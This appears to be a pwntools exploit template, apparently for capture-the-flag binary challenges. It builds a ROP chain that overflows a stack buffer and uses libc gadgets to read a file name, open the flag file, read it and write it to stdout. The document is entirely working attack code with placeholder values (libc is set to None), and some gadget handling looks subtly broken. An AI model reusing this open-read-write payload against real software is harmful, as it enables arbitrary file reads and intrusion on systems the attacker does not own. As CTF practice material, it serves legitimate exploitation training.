from pwn import *

libc = None
rop = ROP(libc)

offset = 0x78

# Gadgets
pop_rdi = rop.rdi.address
pop_rax = rop.rax.address
pop_rsi = rop.rsi.address
pop_rdx = rop.rdx.address
ret = rop.ret.address
syscall = rop.find_gadget(['syscall', 'ret'])
sh = next(libc.search(b"/bin/sh\x00"))
rw_area = libc.bss() # find a suitable spot (must have space for entire flag)

# User conf
in_fd = 0
out_fd = 1
flag_name_len = 9
flag_fd = 3
flag_len = 0x50

def open_read_write():
    payload = b"A"*offset
    # write "flag.txt\0" in rw area with read syscall
    payload += p64(pop_rax) + p64(0) # sys_read
    payload += p64(pop_rdi) + p64(in_fd) # from stdin
    payload += p64(pop_rsi) + p64(rw_area) # dst
    payload += p64(pop_rdx) + p64(flag_name_len) # nbytes
    payload += p64(syscall) # sys_read(in_fd, rw_area, flag_name_len)
    # do open-read-write chain
    payload += p64(pop_rax) + p64(2) # syscall 2 (open)
    payload += p64(pop_rsi) + p64(0) # open readonly
    payload += p64(pop_rdi) + p64(rw_area) # path to flag
    payload += p64(syscall) # sys_open("/path/to/flag", O_RDONLY)
    payload += p64(pop_rdi) + p64(flag_fd) # assume the fd returned by open is 3
    payload += p64(pop_rsi) + p64(rw_area) # destination buffer, can be anywhere readable and writable
    payload += p64(pop_rdx) + p64(flag_len) # nbytes
    payload += p64(pop_rax) + p64(0)
    payload += p64(syscall) # sys_read(flag_fd, rw_area, flag_len)
    payload += p64(pop_rdi) + p64(out_fd)
    payload += p64(pop_rsi) + p64(rw_area) # buffer
    payload += p64(pop_rdx) + p64(flag_len) # nbytes
    payload += p64(pop_rax) + p64(1) # sys_write
    payload += p64(syscall) # sys_write(out_fd, rw_area, flag_len)
    return payload
